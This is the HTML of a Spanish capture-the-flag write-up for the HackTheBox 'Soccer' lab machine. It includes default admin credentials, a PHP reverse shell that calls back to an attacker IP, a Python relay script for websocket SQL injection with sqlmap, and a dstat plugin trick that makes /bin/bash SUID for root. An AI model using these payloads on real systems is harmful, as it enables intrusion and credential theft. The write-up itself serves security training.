<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HackTheBox - Soccer | Mhil4ne</title><meta name=keywords content="Easy"><meta name=description content="En este articulo vamos a estar resolviendo la maquina soccer de HTB.
Comprobamos conexion con la maquina victima:
‚ùØ ping -c 1 10.10.11.194 PING 10.10.11.194 (10.10.11.194) 56(84) bytes of data. 64 bytes from 10.10.11.194: icmp_seq=1 ttl=63 time=81.0 ms --- 10.10.11.194 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 81.018/81.018/81.018/0.000 ms Vamos a realizar nuestro escaneo con nmap:
‚ùØ nmap 10.10.11.194 Nmap scan report for 10."><meta name=author content="Mhil4ne"><link rel=canonical href=/posts/soccer/><link crossorigin=anonymous href=/assets/css/stylesheet.6a98292fb8fa8cf0f3ba4042d4b75515c04267550f3ad49ff6271b5af9562443.css integrity="sha256-apgpL7j6jPDzukBC1LdVFcBCZ1UPOtSf9icbWvlWJEM=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=favicon.ico><link rel=icon type=image/png sizes=16x16 href=%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style></noscript><meta property="og:title" content="HackTheBox - Soccer"><meta property="og:description" content="En este articulo vamos a estar resolviendo la maquina soccer de HTB.
Comprobamos conexion con la maquina victima:
‚ùØ ping -c 1 10.10.11.194 PING 10.10.11.194 (10.10.11.194) 56(84) bytes of data. 64 bytes from 10.10.11.194: icmp_seq=1 ttl=63 time=81.0 ms --- 10.10.11.194 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 81.018/81.018/81.018/0.000 ms Vamos a realizar nuestro escaneo con nmap:
‚ùØ nmap 10.10.11.194 Nmap scan report for 10."><meta property="og:type" content="article"><meta property="og:url" content="/posts/soccer/"><meta property="og:image" content="%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-03-14T00:00:00+00:00"><meta property="article:modified_time" content="2023-03-14T00:00:00+00:00"><meta property="og:site_name" content="Mhil4ne"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="HackTheBox - Soccer"><meta name=twitter:description content="En este articulo vamos a estar resolviendo la maquina soccer de HTB.
Comprobamos conexion con la maquina victima:
‚ùØ ping -c 1 10.10.11.194 PING 10.10.11.194 (10.10.11.194) 56(84) bytes of data. 64 bytes from 10.10.11.194: icmp_seq=1 ttl=63 time=81.0 ms --- 10.10.11.194 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 81.018/81.018/81.018/0.000 ms Vamos a realizar nuestro escaneo con nmap:
‚ùØ nmap 10.10.11.194 Nmap scan report for 10."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"/posts/"},{"@type":"ListItem","position":3,"name":"HackTheBox - Soccer","item":"/posts/soccer/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HackTheBox - Soccer","name":"HackTheBox - Soccer","description":"En este articulo vamos a estar resolviendo la maquina soccer de HTB.\nComprobamos conexion con la maquina victima:\n‚ùØ ping -c 1 10.10.11.194 PING 10.10.11.194 (10.10.11.194) 56(84) bytes of data. 64 bytes from 10.10.11.194: icmp_seq=1 ttl=63 time=81.0 ms --- 10.10.11.194 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 81.018/81.018/81.018/0.000 ms Vamos a realizar nuestro escaneo con nmap:\n‚ùØ nmap 10.10.11.194 Nmap scan report for 10.","keywords":["Easy"],"articleBody":" En este articulo vamos a estar resolviendo la maquina soccer de HTB.\nComprobamos conexion con la maquina victima:\n‚ùØ ping -c 1 10.10.11.194 PING 10.10.11.194 (10.10.11.194) 56(84) bytes of data. 64 bytes from 10.10.11.194: icmp_seq=1 ttl=63 time=81.0 ms --- 10.10.11.194 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 81.018/81.018/81.018/0.000 ms Vamos a realizar nuestro escaneo con nmap:\n‚ùØ nmap 10.10.11.194 Nmap scan report for 10.10.11.194 PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 9091/tcp open xmltec-xmlmail Tenemos 3 puertos abiertos en la maquina, en estos miramos 3 sevicios.\nLo primero que vamos a hacer es mirar el puerto 80, ya que este servicio es web.\nMirando la cabecera Location al hacer una petici√≥n curl podemos ver el dominio.\n‚ùØ curl -s 10.10.11.194 -I | grep Location Location: http://soccer.htb/ ponemos la direccion de esta web en nuestro /etc/hosts.\n‚ùØ echo \"10.10.11.194 soccer.htb\" | sudo tee -a /etc/hosts Ya podriamos acceder a la web.\nUtilizaremos gobuster, para listar directorios.\n‚ùØ gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 100 =============================================================== [+] Url: http://soccer.htb [+] Threads: 100 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt =============================================================== Starting gobuster in directory enumeration mode =============================================================== /tiny (Status: 301) [Size: 178] [--\u003e http://soccer.htb/tiny/] Encotramos un subdomain, http://soccer.htb/tiny/\nMiramos un tiny Login file manager.\nBuscando credenciales por defecto en google, encontramos las credenciales\nUsername: admin Password: admin@123 con esto logramos acceso al file manager. podemos ver los archivos de la web y del directorio tiny.\nTambien miramos que podemos subir archivos en este boton que sale en la parte superior de la pagina.\nPodemos ver que la pagina esta hecha en php, por lo que vamos a intentar mandar una reverse shell en codigo php.\ncreamos un archivo que le podemos llamar ‚Äúshell.php‚Äù en el cual vamos a escribir nuestro comando que sera ejecutado en la maquina victima.\n\u003c?php system(\"bash -c 'bash -i \u003e\u0026 /dev/tcp/10.10.14.85/443 0\u003e\u00261'\") ?\u003e La ip que colocamos es la de atacante.\nAqui les dejo este generador de reverse shells, https://www.revshells.com/\nLuego de crear nuestro archivo, lo subimos al file manager.\nnos colocamos en escucha por el puerto 443:\n‚ùØ sudo netcat -lvnp 443 [sudo] password for mhil4ne: listening on [any] 443 ... Invocamos nuestro shell.php:\n‚ùØ curl soccer.htb/tiny/uploads/shell.php Con esto ya tenemos reverse shell, como www-data.\nahora miramos el puerto 9091.\nVamos a hacer un sql injection al web socket. Encontre un exploit escrito en python para esto, modificamos algunas lineas del codigo para adactarlo a la maquina victima, es el siguiente:\nfrom http.server import SimpleHTTPRequestHandler from socketserver import TCPServer from urllib.parse import unquote, urlparse from websocket import create_connection ws_server = \"ws://soccer.htb:9091/\" def send_ws(payload): ws = create_connection(ws_server) message = unquote(payload).replace('\"','\\'') data = '{\"id\":\"%s\"}' % message ws.send(data) resp = ws.recv() ws.close() if resp: return resp else: return '' def middleware_server(host_port,content_type=\"text/plain\"): class CustomHandler(SimpleHTTPRequestHandler): def do_GET(self) -\u003e None: self.send_response(200) try: payload = urlparse(self.path).query.split('=',1)[1] except IndexError: payload = False if payload: content = send_ws(payload) else: content = 'No parameters specified!' self.send_header(\"Content-type\", content_type) self.end_headers() self.wfile.write(content.encode()) return class _TCPServer(TCPServer): allow_reuse_address = True httpd = _TCPServer(host_port, CustomHandler) httpd.serve_forever() print(\"[+] Iniciando Servidor MiddleWare\") print(\"[+] Enviando payloads\") try: middleware_server(('0.0.0.0',8081)) except KeyboardInterrupt: pass Este exploit lo que hace es redirigir las peticiones, vamos a ejecutarlo:\n‚ùØ python3 exploit.py [+] Iniciando Servidor MiddleWare [+] Enviando payloads al localhost Ahora con sqlmap, como teniamos configurado en el exploit de python, apuntamos a nuestro localhost y tratamos de listar bases de datos:\n‚ùØ sqlmap -u \"http://127.0.0.1:8081/?id=1\" --batch -dbs Database: soccer_db [1 table] +----------+ | accounts | +----------+ Tenemos la tabla accounts, vamos enumerarla:\n‚ùØ sqlmap -u \"http://127.0.0.1:8081/?id=1\" --batch -D soccer_db -T accounts -columns Database: soccer_db Table: accounts [4 columns] +----------+-------------+ | Column | Type | +----------+-------------+ | email | varchar(40) | | id | int | | password | varchar(40) | | username | varchar(40) | +----------+-------------+ Nos interesan las columnas username y password.\n‚ùØ sqlmap -u \"http://127.0.0.1:8081/?id=1\" --batch -D soccer_db -T accounts -C username,password -dump Database: soccer_db Table: accounts [1 entry] +----------+----------------------+ | username | password | +----------+----------------------+ | player | PlayerOfthe********* | +----------+----------------------+ Anteriormente habiamos visto en el escaneo, el puerto 22 por ssh, vamos a intentar con estas credenciales logearnos.\n‚ùØ ssh player@10.10.11.194 player@10.10.11.194's password: Ya tenemos la user flag.\nahora solo tendriamos que elevar privilegios.\nlistamos contenido de la siguiente ruta:\nplayer@soccer:~$ ls -la /usr/local/share/dstat total 8 drwxrwx--- 2 root player 4096 Mar 14 16:21 . drwxr-xr-x 6 root root 4096 Nov 17 09:16 .. Miramos que Tenemos capacidad de escritura en la ruta share/dstat, donde se guardan los plugins.\nLo que vamos a hacer es crear un archivo en python, para luego ejecutarlo como si fuera plugin, ya que tenemos permisos en esta ruta.\necho 'import os;os.system(\"chmod u+s /bin/bash\")' \u003e dstat_privesc.py luego\ndoas -u root /usr/bin/dstat --privesc \u0026\u003e/dev/null Ya con esto, solo nos quedaria pasarnos a la bash con el parametro -p\nbash -p Ya tenemos la root flag.\nbash-5.0# ls /root/root.txt /root/root.txt bash-5.0# ","wordCount":"806","inLanguage":"en","datePublished":"2023-03-14T00:00:00Z","dateModified":"2023-03-14T00:00:00Z","author":{"@type":"Person","name":"Mhil4ne"},"mainEntityOfPage":{"@type":"WebPage","@id":"/posts/soccer/"},"publisher":{"@type":"Organization","name":"Mhil4ne","logo":{"@type":"ImageObject","url":"favicon.ico"}}}</script></head><body class=dark id=top><header class=header><nav class=nav><div class=logo><a href accesskey=h title="Mhil4ne (Alt + H)"><img src=/img/pro3.png alt aria-label=logo height=40>Mhil4ne</a><div class=logo-switches></div></div><ul id=menu><li><a href=/ title=üè†Home><span>üè†Home</span></a></li><li><a href=/archives/ title=üìíArchives><span>üìíArchives</span></a></li><li><a href=/search/ title="üîçSearch (Alt + /)" accesskey=/><span>üîçSearch</span></a></li><li><a href=/tags/ title=üîñTags><span>üîñTags</span></a></li><li><a href=/about/ title=üë§About><span>üë§About</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class=post-title>HackTheBox - Soccer</h1><div class=post-meta><span title='2023-03-14 00:00:00 +0000 UTC'>March 14, 2023</span>&nbsp;¬∑&nbsp;4 min&nbsp;¬∑&nbsp;Mhil4ne</div></header><div class=post-content><p><img loading=lazy src=/img/post/soccer/soccer.png alt=img>
En este articulo vamos a estar resolviendo la maquina soccer de HTB.</p><p>Comprobamos conexion con la maquina victima:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚ùØ ping -c <span class=m>1</span> 10.10.11.194
</span></span><span class=line><span class=cl>PING 10.10.11.194 <span class=o>(</span>10.10.11.194<span class=o>)</span> 56<span class=o>(</span>84<span class=o>)</span> bytes of data.
</span></span><span class=line><span class=cl><span class=m>64</span> bytes from 10.10.11.194: <span class=nv>icmp_seq</span><span class=o>=</span><span class=m>1</span> <span class=nv>ttl</span><span class=o>=</span><span class=m>63</span> <span class=nv>time</span><span class=o>=</span>81.0 ms
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>--- 10.10.11.194 ping statistics ---
</span></span><span class=line><span class=cl><span class=m>1</span> packets transmitted, <span class=m>1</span> received, 0% packet loss, <span class=nb>time</span> 0ms
</span></span><span class=line><span class=cl>rtt min/avg/max/mdev <span class=o>=</span> 81.018/81.018/81.018/0.000 ms
</span></span></code></pre></div><p>Vamos a realizar nuestro escaneo con nmap:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚ùØ nmap 10.10.11.194
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.194
</span></span><span class=line><span class=cl>PORT     STATE SERVICE
</span></span><span class=line><span class=cl>22/tcp   open  ssh
</span></span><span class=line><span class=cl>80/tcp   open  http
</span></span><span class=line><span class=cl>9091/tcp open  xmltec-xmlmail
</span></span></code></pre></div><p>Tenemos 3 puertos abiertos en la maquina, en estos miramos 3 sevicios.</p><p>Lo primero que vamos a hacer es mirar el puerto 80, ya que este servicio es web.</p><p>Mirando la cabecera Location al hacer una petici√≥n curl podemos ver el dominio.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚ùØ curl -s 10.10.11.194 -I <span class=p>|</span> grep Location
</span></span><span class=line><span class=cl>Location: http://soccer.htb/
</span></span></code></pre></div><p>ponemos la direccion de esta web en nuestro /etc/hosts.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚ùØ <span class=nb>echo</span> <span class=s2>&#34;10.10.11.194 soccer.htb&#34;</span> <span class=p>|</span> sudo tee -a /etc/hosts
</span></span></code></pre></div><p>Ya podriamos acceder a la web.</p><p>Utilizaremos gobuster, para listar directorios.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚ùØ gobuster dir -u http://soccer.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t <span class=nv>100</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:                     http://soccer.htb
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:                 <span class=m>100</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Starting gobuster in directory enumeration <span class=nv>mode</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>/tiny                 <span class=o>(</span>Status: 301<span class=o>)</span> <span class=o>[</span>Size: 178<span class=o>]</span> <span class=o>[</span>--&gt; http://soccer.htb/tiny/<span class=o>]</span>
</span></span></code></pre></div><p>Encotramos un subdomain, <a href=http://soccer.htb/tiny/>http://soccer.htb/tiny/</a></p><p><img loading=lazy src=/img/post/soccer/domain.png alt=img></p><p>Miramos un tiny Login file manager.</p><p>Buscando credenciales por defecto en google, encontramos las credenciales</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Username: admin
</span></span><span class=line><span class=cl>Password: admin@123
</span></span></code></pre></div><p><img loading=lazy src=/img/post/soccer/files.png alt=img></p><p>con esto logramos acceso al file manager. podemos ver los archivos de la web y del directorio tiny.</p><p><img loading=lazy src=/img/post/soccer/up.png alt=img>
Tambien miramos que podemos subir archivos en este boton que sale en la parte superior de la pagina.</p><p><img loading=lazy src=/img/post/soccer/php.png alt=img>
Podemos ver que la pagina esta hecha en php, por lo que vamos a intentar mandar una reverse shell en codigo php.</p><p>creamos un archivo que le podemos llamar &ldquo;shell.php&rdquo; en el cual vamos a escribir nuestro comando que sera ejecutado en la maquina victima.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>    <span class=nx>system</span><span class=p>(</span><span class=s2>&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.85/443 0&gt;&amp;1&#39;&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></div><p>La ip que colocamos es la de atacante.</p><p>Aqui les dejo este generador de reverse shells, <a href=https://www.revshells.com/>https://www.revshells.com/</a></p><p><img loading=lazy src=/img/post/soccer/subir.png alt=img>
Luego de crear nuestro archivo, lo subimos al file manager.</p><p>nos colocamos en escucha por el puerto 443:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚ùØ sudo netcat -lvnp <span class=m>443</span>
</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> mhil4ne: 
</span></span><span class=line><span class=cl>listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>443</span> ...
</span></span></code></pre></div><p>Invocamos nuestro shell.php:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚ùØ curl soccer.htb/tiny/uploads/shell.php
</span></span></code></pre></div><p>Con esto ya tenemos reverse shell, como www-data.</p><p>ahora miramos el puerto 9091.</p><p>Vamos a hacer un sql injection al web socket.
Encontre un exploit escrito en python para esto, modificamos algunas lineas del codigo para adactarlo a la maquina
victima, es el siguiente:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>http.server</span> <span class=kn>import</span> <span class=n>SimpleHTTPRequestHandler</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>socketserver</span> <span class=kn>import</span> <span class=n>TCPServer</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>urllib.parse</span> <span class=kn>import</span> <span class=n>unquote</span><span class=p>,</span> <span class=n>urlparse</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>websocket</span> <span class=kn>import</span> <span class=n>create_connection</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>ws_server</span> <span class=o>=</span> <span class=s2>&#34;ws://soccer.htb:9091/&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_ws</span><span class=p>(</span><span class=n>payload</span><span class=p>):</span>
</span></span><span class=line><span class=cl>	<span class=n>ws</span> <span class=o>=</span> <span class=n>create_connection</span><span class=p>(</span><span class=n>ws_server</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	
</span></span><span class=line><span class=cl>	<span class=n>message</span> <span class=o>=</span> <span class=n>unquote</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span><span class=o>.</span><span class=n>replace</span><span class=p>(</span><span class=s1>&#39;&#34;&#39;</span><span class=p>,</span><span class=s1>&#39;</span><span class=se>\&#39;</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>data</span> <span class=o>=</span> <span class=s1>&#39;{&#34;id&#34;:&#34;</span><span class=si>%s</span><span class=s1>&#34;}&#39;</span> <span class=o>%</span> <span class=n>message</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>ws</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>resp</span> <span class=o>=</span> <span class=n>ws</span><span class=o>.</span><span class=n>recv</span><span class=p>()</span>
</span></span><span class=line><span class=cl>	<span class=n>ws</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=n>resp</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=n>resp</span>
</span></span><span class=line><span class=cl>	<span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span> <span class=s1>&#39;&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>middleware_server</span><span class=p>(</span><span class=n>host_port</span><span class=p>,</span><span class=n>content_type</span><span class=o>=</span><span class=s2>&#34;text/plain&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>class</span> <span class=nc>CustomHandler</span><span class=p>(</span><span class=n>SimpleHTTPRequestHandler</span><span class=p>):</span>
</span></span><span class=line><span class=cl>		<span class=k>def</span> <span class=nf>do_GET</span><span class=p>(</span><span class=bp>self</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=kc>None</span><span class=p>:</span>
</span></span><span class=line><span class=cl>			<span class=bp>self</span><span class=o>.</span><span class=n>send_response</span><span class=p>(</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>				<span class=n>payload</span> <span class=o>=</span> <span class=n>urlparse</span><span class=p>(</span><span class=bp>self</span><span class=o>.</span><span class=n>path</span><span class=p>)</span><span class=o>.</span><span class=n>query</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=s1>&#39;=&#39;</span><span class=p>,</span><span class=mi>1</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span>
</span></span><span class=line><span class=cl>			<span class=k>except</span> <span class=ne>IndexError</span><span class=p>:</span>
</span></span><span class=line><span class=cl>				<span class=n>payload</span> <span class=o>=</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>				
</span></span><span class=line><span class=cl>			<span class=k>if</span> <span class=n>payload</span><span class=p>:</span>
</span></span><span class=line><span class=cl>				<span class=n>content</span> <span class=o>=</span> <span class=n>send_ws</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>				<span class=n>content</span> <span class=o>=</span> <span class=s1>&#39;No parameters specified!&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>			<span class=bp>self</span><span class=o>.</span><span class=n>send_header</span><span class=p>(</span><span class=s2>&#34;Content-type&#34;</span><span class=p>,</span> <span class=n>content_type</span><span class=p>)</span>
</span></span><span class=line><span class=cl>			<span class=bp>self</span><span class=o>.</span><span class=n>end_headers</span><span class=p>()</span>
</span></span><span class=line><span class=cl>			<span class=bp>self</span><span class=o>.</span><span class=n>wfile</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=n>content</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>			<span class=k>return</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=k>class</span> <span class=nc>_TCPServer</span><span class=p>(</span><span class=n>TCPServer</span><span class=p>):</span>
</span></span><span class=line><span class=cl>		<span class=n>allow_reuse_address</span> <span class=o>=</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=n>httpd</span> <span class=o>=</span> <span class=n>_TCPServer</span><span class=p>(</span><span class=n>host_port</span><span class=p>,</span> <span class=n>CustomHandler</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=n>httpd</span><span class=o>.</span><span class=n>serve_forever</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Iniciando Servidor MiddleWare&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[+] Enviando payloads&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=n>middleware_server</span><span class=p>((</span><span class=s1>&#39;0.0.0.0&#39;</span><span class=p>,</span><span class=mi>8081</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>except</span> <span class=ne>KeyboardInterrupt</span><span class=p>:</span>
</span></span><span class=line><span class=cl>	<span class=k>pass</span>
</span></span></code></pre></div><p>Este exploit lo que hace es redirigir las peticiones, vamos a ejecutarlo:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚ùØ python3 exploit.py
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Iniciando Servidor MiddleWare
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Enviando payloads al localhost
</span></span></code></pre></div><p>Ahora con sqlmap, como teniamos configurado en el exploit de python, apuntamos a nuestro localhost y tratamos de listar bases de datos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚ùØ sqlmap -u <span class=s2>&#34;http://127.0.0.1:8081/?id=1&#34;</span> --batch -dbs
</span></span><span class=line><span class=cl>Database: soccer_db
</span></span><span class=line><span class=cl><span class=o>[</span><span class=m>1</span> table<span class=o>]</span>
</span></span><span class=line><span class=cl>+----------+
</span></span><span class=line><span class=cl><span class=p>|</span> accounts <span class=p>|</span>
</span></span><span class=line><span class=cl>+----------+
</span></span></code></pre></div><p>Tenemos la tabla accounts, vamos enumerarla:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚ùØ sqlmap -u <span class=s2>&#34;http://127.0.0.1:8081/?id=1&#34;</span> --batch -D soccer_db -T accounts -columns
</span></span><span class=line><span class=cl>Database: soccer_db
</span></span><span class=line><span class=cl>Table: accounts
</span></span><span class=line><span class=cl><span class=o>[</span><span class=m>4</span> columns<span class=o>]</span>
</span></span><span class=line><span class=cl>+----------+-------------+
</span></span><span class=line><span class=cl><span class=p>|</span> Column   <span class=p>|</span> Type        <span class=p>|</span>
</span></span><span class=line><span class=cl>+----------+-------------+
</span></span><span class=line><span class=cl><span class=p>|</span> email    <span class=p>|</span> varchar<span class=o>(</span>40<span class=o>)</span> <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> id       <span class=p>|</span> int         <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> password <span class=p>|</span> varchar<span class=o>(</span>40<span class=o>)</span> <span class=p>|</span>
</span></span><span class=line><span class=cl><span class=p>|</span> username <span class=p>|</span> varchar<span class=o>(</span>40<span class=o>)</span> <span class=p>|</span>
</span></span><span class=line><span class=cl>+----------+-------------+
</span></span></code></pre></div><p>Nos interesan las columnas username y password.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>‚ùØ sqlmap -u <span class=s2>&#34;http://127.0.0.1:8081/?id=1&#34;</span> --batch -D soccer_db -T accounts -C username,password -dump
</span></span><span class=line><span class=cl>Database: soccer_db
</span></span><span class=line><span class=cl>Table: accounts
</span></span><span class=line><span class=cl><span class=o>[</span><span class=m>1</span> entry<span class=o>]</span>
</span></span><span class=line><span class=cl>+----------+----------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> username <span class=p>|</span> password             <span class=p>|</span>
</span></span><span class=line><span class=cl>+----------+----------------------+
</span></span><span class=line><span class=cl><span class=p>|</span> player   <span class=p>|</span> PlayerOfthe********* <span class=p>|</span>
</span></span><span class=line><span class=cl>+----------+----------------------+
</span></span></code></pre></div><p>Anteriormente habiamos visto en el escaneo, el puerto 22 por ssh, vamos a intentar con estas credenciales logearnos.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>‚ùØ ssh player@10.10.11.194
</span></span><span class=line><span class=cl>player@10.10.11.194&#39;s password: 
</span></span></code></pre></div><p><img loading=lazy src=/img/post/soccer/user.png alt=img>
Ya tenemos la user flag.</p><p>ahora solo tendriamos que elevar privilegios.</p><p>listamos contenido de la siguiente ruta:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>player@soccer:~$ ls -la /usr/local/share/dstat
</span></span><span class=line><span class=cl>total <span class=m>8</span>
</span></span><span class=line><span class=cl>drwxrwx--- <span class=m>2</span> root player <span class=m>4096</span> Mar <span class=m>14</span> 16:21 .
</span></span><span class=line><span class=cl>drwxr-xr-x <span class=m>6</span> root root   <span class=m>4096</span> Nov <span class=m>17</span> 09:16 ..
</span></span></code></pre></div><p>Miramos que Tenemos capacidad de escritura en la ruta share/dstat, donde se guardan los plugins.</p><p>Lo que vamos a hacer es crear un archivo en python, para luego ejecutarlo como si fuera plugin, ya que tenemos permisos en esta ruta.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;import os;os.system(&#34;chmod u+s /bin/bash&#34;)&#39;</span> &gt; dstat_privesc.py
</span></span></code></pre></div><p>luego</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>doas -u root /usr/bin/dstat --privesc <span class=p>&amp;</span>&gt;/dev/null
</span></span></code></pre></div><p>Ya con esto, solo nos quedaria pasarnos a la bash con el parametro -p</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash -p
</span></span></code></pre></div><p>Ya tenemos la root flag.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bash-5.0# ls /root/root.txt
</span></span><span class=line><span class=cl>/root/root.txt
